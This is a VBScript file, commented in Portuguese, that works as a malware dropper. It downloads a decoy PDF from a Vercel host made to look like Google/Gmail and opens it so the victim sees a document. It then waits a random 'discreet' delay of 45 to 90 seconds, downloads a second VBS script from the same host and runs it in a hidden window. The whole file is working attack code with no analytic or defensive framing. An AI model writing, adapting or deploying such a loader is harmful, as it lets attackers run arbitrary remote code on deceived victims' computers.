' script.vbs - Executa PDF e executa outro código após delay discreto

Set fso = CreateObject("Scripting.FileSystemObject")
tempFolder = fso.GetSpecialFolder(2) ' 2 = TemporaryFolder
pdfPath = tempFolder & "\documento.pdf"

' === Baixa o PDF ===
DownloadFile "https://google-gmail-lemon.vercel.app/documento.pdf", pdfPath

' === Abre PDF com programa padrão ===
Set shell = CreateObject("WScript.Shell")
shell.Run """" & pdfPath & """", 1, False

' === Delay discreto (entre 45 e 90 segundos) ===
WScript.Sleep Int((Rnd() * 45000) + 45000)

' === Baixa e executa outro VBS (ou código inline) ===
Dim payload
payload = DownloadString("https://google-gmail-lemon.vercel.app/arquivo.vbs")

' Salva e executa
tempFile = tempFolder & "\" & Int(Rnd()*10000) & ".vbs"
SaveToFile tempFile, payload
shell.Run """" & tempFile & """", 0, False

' ===== Funções auxiliares =====

Function DownloadFile(url, path)
    Set x = CreateObject("Microsoft.XMLHTTP")
    x.Open "GET", url, False
    x.Send
    If x.Status = 200 Then
        Set s = CreateObject("ADODB.Stream")
        s.Type = 1
        s.Open
        s.Write x.ResponseBody
        s.SaveToFile path, 2
        s.Close
    End If
End Function

Function DownloadString(url)
    Set x = CreateObject("Microsoft.XMLHTTP")
    x.Open "GET", url, False
    x.Send
    If x.Status = 200 Then
        DownloadString = x.ResponseText
    Else
        DownloadString = ""
    End If
End Function

Sub SaveToFile(path, text)
    Set f = fso.CreateTextFile(path, True)
    f.Write text
    f.Close
End Sub
